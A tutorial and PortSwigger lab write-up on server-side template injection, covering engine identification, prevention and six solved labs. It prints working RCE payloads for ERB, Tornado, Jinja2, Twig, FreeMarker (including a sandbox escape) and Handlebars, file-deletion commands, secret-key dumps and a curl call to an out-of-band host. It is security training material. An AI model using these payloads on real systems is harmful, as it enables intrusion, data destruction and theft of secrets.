---
title: "SSTI"
date: 2026-11-11
draft: false
description: "Theory, testing methodology and PortSwigger SSTI lab write-ups."
tags:
  - Labs
  - portswigger
categories:
  - writeups
  - tutorials
---

## Description

Server-Side Template Injection (SSTI) is a vulnerability defined under [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html) - *Improper Neutralization of Special Elements Used in a Template Engine* - and it belongs to the Injection category (A05) of the [OWASP Top Ten 2025](https://owasp.org/Top10/2025/). It occurs when user-supplied input is concatenated into a server-side template instead of being passed to it as data. The template engine then evaluates our input as template syntax, so instead of displaying what we typed, the application executes what we typed. Because template engines can do far more than simple text substitution - calling functions, accessing objects, importing modules - SSTI frequently escalates straight to Remote Code Execution (RCE), which makes it one of the most dangerous web vulnerabilities.

### What is a Template Engine

A template engine is a library that produces dynamic text (usually HTML pages, emails or reports) by combining two things:

- **Template** - a static skeleton written by the developer with special placeholders in it.
- **Data** - the dynamic values (usernames, products, prices, etc.) that fill the placeholders at render time.

The engine parses the template, evaluates the placeholders against the data and outputs the final document. Common engines per language:

| Language | Template engines |
| :-- | :-- |
| Ruby | ERB |
| Python | Jinja2, Tornado, Mako, Django (DTL) |
| PHP | Twig, Smarty |
| Java | FreeMarker, Velocity, Thymeleaf |
| JavaScript (Node.js) | Handlebars, EJS, Nunjucks |

The key point is that the engine does not just insert text - it evaluates expressions. `{{ 7*7 }}` really gets calculated, and that is exactly the property we abuse.

### Templating

Templating means writing a page as a template and letting the engine fill it in. For example, this FreeMarker-style product template from Lab 3:

```text
Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.
```

The static text (`Hurry! Only ... left of ... at ...`) never changes, while the `${...}` placeholders are replaced with real product data at render time. The developer's intention is that `${product.stock}` is replaced by the number in stock. If the engine also evaluates whatever else we put in that spot - like `${7*7}` or `${"freemarker.template.utility.Execute"?new()("id")}` - that is SSTI.

### Impact

- **Remote Code Execution** - most engines can reach language features (imports, functions, reflection), so SSTI very often becomes RCE.
- **Information disclosure** - dumping the application configuration (`{{config.items()}}`), secret keys (`{{ settings.SECRET_KEY }}`) and framework internals.
- **Arbitrary file read/write/delete** - for example Ruby's `Dir` and `File` classes reachable from ERB (see Lab 1).
- **Sandbox escape** - even "safe" sandboxed engines can often be escaped (see Lab 6).

### Identifying SSTI

The first step is to detect whether our input is actually being evaluated. We do this by injecting syntax that only a template engine would process and watching whether the result changes.

A good starting probe is the polyglot string from HackTricks: {{< ssti-polyglot >}}

This single string combines the special characters of almost every template engine (`${...}` FreeMarker/Mako, `{{...}}` Jinja2/Twig/Handlebars, `<%...%>` ERB/EJS, plus quotes and backslashes). It almost never produces valid template output anywhere, so if the application is rendering our input through an engine, it will throw an error - and a verbose error often names the engine directly. If nothing errors, the parameter is probably not being parsed as a template at all.

We can also follow the decision tree below step by step to know exactly which engine we are dealing with:

![SSTI decision tree - follow the probes step by step to identify the template engine](/images/SSTI/SSTI.png)

How we follow the image and decide the engine (green = matched, red = try the next branch, orange = unknown):

1. Send `${7*7}`. If the output contains `49`, the engine uses `${ }` syntax and we follow the upper branch.
   - Send `a{*comment*}b`. If it renders as `ab`, the comment syntax was swallowed by the engine, which means **Smarty**.
   - If not, send `${"z".join("ab")}`. If it renders `azb` (Python's `str.join`), the engine is **Mako**.
   - If neither matches, the engine is **Unknown** - fall back to error messages, documentation or automation tools.
2. If `${7*7}` produced nothing, follow the lower branch and send `{{7*7}}`.
   - If it outputs `49`, send `{{7*'7'}}`. Output `7777777` means Python string repetition, which means **Jinja2**. Output `49` means PHP numeric coercion, which means **Twig**.
   - If it outputs nothing at all, the parameter is probably **Not vulnerable** to SSTI.
3. Alongside the tree, always try to throw an error on purpose (a nonexistent attribute or broken syntax) and read the stack trace - engines like Jinja2, FreeMarker and Tornado leak their names, and sometimes even code snippets, in verbose errors.

### Escalating SSTI - Useful Payloads

Once we know the engine, the next step is usually information disclosure. We can obtain the web application's configuration using the following SSTI payload:

- `{{config.items() }}` - in Flask applications (which use Jinja2), `config` is a global template variable holding the application configuration dictionary. Calling `.items()` dumps every configuration entry, which often contains the `SECRET_KEY`, database URIs, debug flags and API keys.

And one step further into Jinja2 internals:

- `{{ self.__init__.__globals__.__builtins__ }}` - `self` refers to the template object currently being rendered, `__init__` gives its constructor function, `__globals__` exposes the global namespace of that function's module, and `__builtins__` gives us Python's built-in functions. From here it is one step to full RCE, for example `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`.

For Twig (PHP, used by Symfony), the commented payloads work like this:

- `{{['id\x20']|filter('system')}}` - the `filter` filter applies a PHP callable to every element of the array. Passing `system` as the callable makes PHP execute `system('id ')`. The `\x20` is just the hex escape for a space, used because spaces are sometimes filtered or trimmed in payloads.
- `{{ _self }}` - dumping `_self` on older Twig versions (before 1.20 / early 2.x) leaks the internal `Twig_Environment` object, which can be abused for RCE with `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`.

### SSTI Explained for Beginners (OWASP Top Ten 2025)

SSTI belongs to the Injection category of the OWASP Top Ten 2025 (**A05: Injection** - the same family as SQL injection, XSS and command injection; in the 2021 list this category was A03). An injection vulnerability exists wherever an application sends untrusted input to an interpreter - a database, an operating system shell, a browser or, in our case, a template engine - in a position where the interpreter treats it as code instead of data. With SQL injection the interpreter is the database, with command injection it is the shell, and with SSTI it is the template engine. That is why SSTI sits in the same category as those classic bugs and why CWE-1336 exists specifically for it.

How it actually happens - there are two ways to get user data into a rendered page:

```python
# Safe - user input is passed as DATA, the template itself never changes
render("Hello {{ name }}", name=user_input)

# Vulnerable - user input is concatenated into the TEMPLATE SOURCE itself
template_string = "Hello " + user_input
render(template_string)
```

In the safe version, the engine looks up `name` in the context and prints the value, no matter what we type - even if we type `{{ 7*7 }}` it is just a string inside a variable and is never parsed as template syntax. In the vulnerable version, our input becomes part of the template before the engine parses it, so `{{ 7*7 }}` is genuinely parsed and evaluated as an expression and we see `49` back. This single difference - data position vs. code position - is the whole vulnerability.

Why it is dangerous: template engines were built to be powerful. They can access objects and attributes (`user.name`, `settings.SECRET_KEY`), call filters and functions, import modules or Java classes, and reflect over the objects the application passed to them. An attacker climbs a ladder: first prove evaluation (`7*7` -> `49`), then read objects and configuration, then reach dangerous classes or functions, and finally full RCE. Unlike many bugs, SSTI is frequently a one-payload RCE, which is why it is treated so seriously.

Where to look for it: features that render user-supplied content through a template - email templates, PDF or invoice generators, CMS page and theme customization, product description rendering, "Edit template" admin panels (Labs 3, 5 and 6), error pages that embed our input, and any place where input lands inside `{{ }}`, `${ }` or `<% %>` context in the request.

How to test (methodology from HackTricks and PayloadsAllTheThings):

1. Fuzz every reflective parameter with the polyglot and the math probes (`${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, etc.) - exactly the Intruder list we use in Lab 4.
2. Watch for `49`, `7777777` or any rendered difference - that confirms evaluation.
3. Trigger verbose errors with nonexistent attributes (`${ doesnotexist }`, `user.doesnotexist`) and read the engine name from the stack trace.
4. Map the engine with the decision tree above.
5. Escalate per engine using the payload lists - config dump, object access, then RCE.

How to prevent it:

- Never concatenate user input into template source - always pass it as context variables (the data position).
- Prefer logic-less engines (Mustache, Liquid) wherever users may supply template content.
- If user-editable templates are a business requirement, sandbox them (Jinja2 `SandboxedEnvironment`, FreeMarker sandbox) and audit for escapes - Lab 6 shows that sandboxes do get broken.
- Restrict the objects exposed to templates; do not expose `config`, `settings`, internal objects or the whole request.
- Validate and allow-list template content, disable dangerous built-ins where possible, keep the engine updated, and turn off verbose errors in production.

Both references below are worth bookmarking: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) keeps ready-made, engine-by-engine payload lists (Jinja2, Twig, ERB, Tornado, FreeMarker, Handlebars, Mako, Velocity, etc.), and [HackTricks](https://hacktricks.wiki/pentesting-web/ssti-server-side-template-injection/index.html) documents the detection methodology, the decision tree and per-engine notes - between them they cover almost everything you need from identification to RCE.

### Tools

[SSTImap](https://github.com/vladko312/SSTImap) is an automatic SSTI detection and exploitation tool (a successor of tplmap). It identifies the template engine from a URL or a raw HTTP request and can escalate to code execution, file read/write and blind out-of-band detection:

```bash
python3 sstimap.py -u 'https://target.com/?name=*'
```

## PortSwigger SSTI Labs

### Lab 1 : Basic server-side template injection

**Goal :** Review the ERB documentation to find out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

**Analysis :** Based on the search on the internet, we can see ERB is a `RUBY` based template engine, so we can go to the PayloadsAllTheThings SSTI page for the payloads we will be testing. When we turn on `FoxyProxy` and crawl the site, we can see two possible places to inject.

We found two parameters - `message=` and `productId=`. I tested both and found `message=` is the vulnerable one.

```text
productId=<%25%3d+Dir.entries('/')+%25>
```

![Lab 1 - no reflection on the productId parameter](/images/SSTI/Lab1_SSTI1.png)

```text
?message=<%25%3d+Dir.entries('/')+%25>
```

![Lab 1 - directory listing reflected through the message parameter](/images/SSTI/Lab1_SSTI2.png)

**Exploitation :**

The above payload I used, in its decoded version, is - `<%= Dir.entries('/') %>` which performs a directory listing.

How this payload works:

- `<%= ... %>` is the ERB (Embedded Ruby) evaluation tag. ERB is Ruby's standard templating library - it takes a template containing embedded Ruby code and renders it into a final string. Anything placed between `<%=` and `%>` is executed as Ruby and its return value is inserted into the output.
- `Dir.entries('/')` is a Ruby core API. `Dir` is the directory class and `entries` returns an array of every file and folder in the path given - here the root directory `/`. Because the result is inserted into the rendered page, we get the directory listing back in the HTTP response.
- On the wire we send it URL-encoded (`<%25%3d+Dir.entries('/')+%25>`) because `<`, `>`, `=` and spaces must be encoded inside a GET parameter - `Ctrl+Shift+U` in Burp Decoder does this quickly.

We already know that `morale.txt` is under `/home/carlos/`, so we will try to check whether it really exists and try to delete it.

![Lab 1 - confirming morale.txt exists in /home/carlos](/images/SSTI/Lab1_SSTI3.png)

Payload we used to delete - `<%25+File.delete('/home/carlos/morale.txt')+%25>` - this is the URL-encoded version.

Original - `<% File.delete('/home/carlos/morale.txt') %>`

How this payload works:

- `<% ... %>` is the ERB script tag. Unlike `<%= %>`, it executes the Ruby code but inserts nothing into the output - perfect for performing actions instead of displaying values.
- `File.delete('/home/carlos/morale.txt')` is Ruby's standard library call to remove a file from disk. The moment the template is rendered server-side, the file gets deleted.
- A useful detail about ERB: everything between the tags is evaluated with full access to Ruby's standard library, so classes like `Dir` and `File` are directly reachable. That is why reading the ERB documentation is enough to find both file listing and file deletion.

![Lab 1 - morale.txt deleted and the lab solved](/images/SSTI/Lab1_SSTI4.png)

And we can see we solved the lab.

### Lab 2 : Basic server-side template injection (code context)

**Goal :** Delete the `morale.txt` file from Carlos's home directory.

**Analysis :**

Based on the analysis, we can see that it is a Tornado template if we try to manipulate the `user.name` attribute into a nonexistent attribute such as `user.doesnotexist` etc.

It will `302` in Burp Suite, but in the blog post -> view details page we can see that it throws an error.

```http
blog-post-author-display=user.doesnotexist&csrf=uFxEU0yi7n5rlifkTSkVIYD4SWitfIpU
```

![Lab 2 - nonexistent attribute throws a Tornado error](/images/SSTI/Lab2-SSTI1.png)

When we try to comment in the post and view it back, we can see our username there.

**Exploitation :**

So we will try with the Tornado payload from HackTricks which will be like this - `{% import os %}{{ os.popen("whoami").read() }}`

![Lab 2 - first Tornado payload attempt](/images/SSTI/Lab2-SSTI3.png)

But that also throws an error, so we will need to analyze the backend code based on its syntax.

```python
def render_comment_author(user, preferred_name_setting):
    # The vulnerable line: user input is directly concatenated into the template.
    template_string = "{{ " + preferred_name_setting + " }}"

    # The template is then rendered by Tornado.
    return tornado.template.Template(template_string).generate(user=user)
```

The example code will be like this, which tries to concatenate `user.name` into `{{ this bracket }}`.

So our input does not start its own template - it lands inside an already-open `{{ ... }}` expression. Tornado template syntax is: `{{ expression }}` outputs a value, and `{% statement %}` executes template statements such as `{% import os %}`.

We will need to adapt the payload into - `user.name}}{% import os %}{{ os.popen("whoami").read() }}` - which first closes the `{{` bracket of the original code with `}}` and then injects our new malicious payload.

- `user.name` - keeps the original expression valid so nothing breaks before our payload.
- `}}` - closes the `{{` opened by the application.
- `{% import os %}` - imports the Python `os` module into the template scope.
- `{{ os.popen("whoami").read() }}` - runs `whoami` through `os.popen` and prints the output.

We can see it works - the output shows in the place where our comment's username is displayed.

![Lab 2 - RCE through the code context](/images/SSTI/Lab2-SSTI2.png)

We can assume we got RCE and just need to check `morale.txt` with:

`ls /home/carlos` -

```text
blog-post-author-display=user.name}}{% import os %}{{ os.popen("ls /home/carlos").read() }}&csrf=uaVxsy2wWwdrsaSX6NuuUUuyRxQsJSzH
```

We can see it exists. When we delete it with `rm /home/carlos/morale.txt`, we can see the lab is solved.

### Lab 3 : Server-side template injection using documentation

**Goal :** Use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

**Analysis :**

Based on the analysis, we can see there is an `Edit Template` function. When we go there, we can see a bunch of text and places to edit in the template with a preview.

So we will delete the unnecessary things and just leave the attributes that are using the template format -

`Hurry! Only ${product.stock} left of ${product.name} at ${product.price}.`

When we try to intercept in Burp Suite, we cannot see anything there, so I try to test the attributes directly in the web page with attributes which do not exist in the application, and we can see it throws an error.

![Lab 3 - nonexistent attribute triggers a FreeMarker error](/images/SSTI/Lab3-SSTI1.png)

We can see this is the FreeMarker template engine.

**Exploitation :**

So we try to search for the payload in HackTricks - `${"freemarker.template.utility.Execute"?new()("id")}` and we got RCE.

How this payload works:

- In FreeMarker, `?new()` is a built-in that instantiates a Java class from its fully qualified name given as a string.
- `freemarker.template.utility.Execute` is a legacy FreeMarker utility class whose whole job is to execute an operating system command passed as an argument.
- So `"freemarker.template.utility.Execute"?new()` creates an instance of that class, and the trailing `("id")` invokes it with `id` as the command. The `${ ... }` wrapper makes the result print into the page.

![Lab 3 - RCE with the Execute class](/images/SSTI/Lab3-SSTI2.png)

When we check for `morale.txt`, we can see it exists.

![Lab 3 - confirming morale.txt exists](/images/SSTI/Lab3-SSTI3.png)

So we delete it and the lab is solved.

![Lab 3 - morale.txt deleted and the lab solved](/images/SSTI/Lab3-SSTI4.png)

### Lab 4 : Server-side template injection in an unknown language with a documented exploit

**Goal :** Execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

**Analysis :**

We can see there is a product function which is

`https://0af200630374289080ec622c003700e4.web-security-academy.net/?message=Unfortunately this product is out of stock ` - when there is no stock left, it shows output to the user like this, so we will try to manipulate that parameter to see whether we can put whatever we want there and get it reflected.

`https://0af200630374289080ec622c003700e4.web-security-academy.net/?message=doesnotexist` and the output shows `doesnotexist`.

![Lab 4 - message parameter reflects user input](/images/SSTI/Lab4-SSTI1.png)

![Lab 4 - reflection confirmed](/images/SSTI/Lab4-SSTI2.png)

So we will send it to Intruder and try to find out the template.

**Exploitation :**

Payload list we will use to trigger an error from the server -

```txt
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
*{7*7}
${{7*7}}
@[7*7]
[[7*8]]
{{= 7*7}}
${{7*7}}
`7*7`
```

When it triggers an error, we will see what template is used.

![Lab 4 - 500 error reveals the engine](/images/SSTI/Lab4-SSTI3.png)

We can see there is a 500 Internal Server Error and the template is - `handlebars`

![Lab 4 - handlebars parse error](/images/SSTI/Lab4-SSTI4.png)

![Lab 4 - identifying the engine from the error](/images/SSTI/Lab4-SSTI5.png)

If we search in HackTricks, we can see the payload which is -

```text
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

There is also a blog post with details about this payload - http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

Short version of how this payload works: Handlebars is a logic-less engine and does not allow arbitrary JavaScript, but block parameters (`as |string|`) give us a raw JS string object. Through `string.sub` (a `String.prototype` function) and its `constructor`, we reach the `Function` constructor, push our own JS source with `this.push "return require('child_process').exec('...');"`, and finally call it with `string.sub.apply 0 codelist` - which compiles and runs our JavaScript, giving RCE through Node's `child_process`.

When we URL-encode this in Burp Decoder and send it, there is nothing - we can't see the output of `whoami`.

![Lab 4 - whoami gives no visible output](/images/SSTI/Lab4-SSTI6.png)

So we will try to directly delete `morale.txt` by changing the payload line -

`{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}`

![Lab 4 - morale.txt deleted and the lab solved](/images/SSTI/Lab4-SSTI7.png)

And when we go back to the lab, we can see it is solved.

Note : If you don't want to directly delete it and would rather test to confirm we can run RCE, we can use Burp Collaborator in the payload -

`{{this.push "return require('child_process').exec('curl http://<ourCollaborator.net>');"}}` - URL-encoded as above and hit send.

Then click `Poll now` and you can see we get DNS and HTTP requests.

### Lab 5 : Server-side template injection with information disclosure via user-supplied objects

**Goal :** Steal and submit the framework's secret key.

**Analysis :**

We have login credentials which are - `content-manager:C0nt3ntM4n4g3r`

We can see an Edit template function like in Lab 3, and the template attribute is using `{{ }}`. So we can assume this is a Python-based template and try to put some kind of payload which can reveal the error - `{{'a'.toUpperCase()}}`. In this case, we use the `Jinjava` payload which is not related to a Python-based engine, and we can see the template is `Django`.

![Lab 5 - error message identifies the Django engine](/images/SSTI/Lab5-SSTI1.png)

**Exploitation :**

We try to find the payload for testing in `Django`. Unlike Jinja2, the native Django Template Language (DTL) strictly prohibits executing arbitrary Python expressions, functions, or strings with underscores inside the template tags.

The payload we use to see the allowed functions - `{% debug %}`

Enabling this built-in tag outputs a massive dump of the current context, active variables, and loaded modules.

![Lab 5 - the debug tag dumps the context](/images/SSTI/Lab5-SSTI2.png)

We can see that `Settings` can be used.

Payload - `{{ settings.ADMINS }}`

When we go to `ADMINS` in the docs, we can see it reflects the default empty array - `[]` as shown in the Django official settings.

![Lab 5 - settings.ADMINS returns the default empty list](/images/SSTI/Lab5-SSTI3.png)

Django Settings - https://docs.djangoproject.com/en/4.0/ref/settings/

Payload - `{{ settings.SECRET_KEY }}`

So we will try to read the `SECRET_KEY`, put only that in the submit solution, and the lab is solved.

### Lab 6 : Server-side template injection in a sandboxed environment

**Goal :** Break out of the sandbox to read the file `my_password.txt` from Carlos's home directory.

**Analysis :** We can see the template edit place as in the previous labs.

Note : We already have the template type in the lab description, but here we will try to figure it out by ourselves without looking it up.

As in the previous labs, we will try to place a payload or something that doesn't exist to trigger an error and see what we get here.

The payload edit place uses `${}`, so we try to search for that in HackTricks (Ctrl+F to search). But it is used in many things, so we try to put something which doesn't exist - `${ doesnotexist }` - and we can see the lab triggers an error and the template is `FreeMarker`.

![Lab 6 - error confirms FreeMarker](/images/SSTI/Lab6-SSTI1.png)

**Exploitation :**

Based on the lab description, we will use the payload which is a sandbox bypass -

```text
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

When we put this, it throws an error because the `article` attribute doesn't exist. So we try to ref the `product` attribute, which exists.

```text
<#assign classloader=product.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("id")}
```

How this payload works:

- `product.class.protectionDomain.classLoader` - a Java reflection walk. `.class` on the `product` object gives its `java.lang.Class`, `.protectionDomain` gives the `ProtectionDomain`, and `.classLoader` gives the `ClassLoader` that loaded it. The sandbox blocks `?new()` directly, but not this object traversal.
- `classloader.loadClass("freemarker.template.ObjectWrapper")` - loads FreeMarker's `ObjectWrapper` class through the class loader.
- `owc.getField("DEFAULT_WRAPPER").get(null)` - reads the static `DEFAULT_WRAPPER` field.
- `classloader.loadClass("freemarker.template.utility.Execute")` - loads the same `Execute` command-execution class we abused in Lab 3.
- `${dwf.newInstance(ec,null)("id")}` - creates a new instance of `Execute` via reflection and calls it with `id` as the command. `<#assign ... >` is FreeMarker's way of declaring template variables.

And we can see this works.

![Lab 6 - sandbox bypass gives command execution](/images/SSTI/Lab6-SSTI2.png)

We will try to see what exists in our directory with `ls`, found the `my_password.txt`, then use `cat my_password.txt` in place of `id`.

And the lab is solved when we submit the password.

![Lab 6 - password read from my_password.txt](/images/SSTI/Lab6-SSTI3.png)

## References

- [PortSwigger - Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks - SSTI (Server-Side Template Injection)](https://hacktricks.wiki/pentesting-web/ssti-server-side-template-injection/index.html)
- [PayloadsAllTheThings - Server Side Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [OWASP Top 10 2025](https://owasp.org/Top10/2025/)
- [CWE-1336 - Improper Neutralization of Special Elements Used in a Template Engine](https://cwe.mitre.org/data/definitions/1336.html)
- [SSTImap](https://github.com/vladko312/SSTImap)
- [Handlebars template injection and RCE - mahmoudsec](http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
- [Django Settings Reference](https://docs.djangoproject.com/en/4.0/ref/settings/)
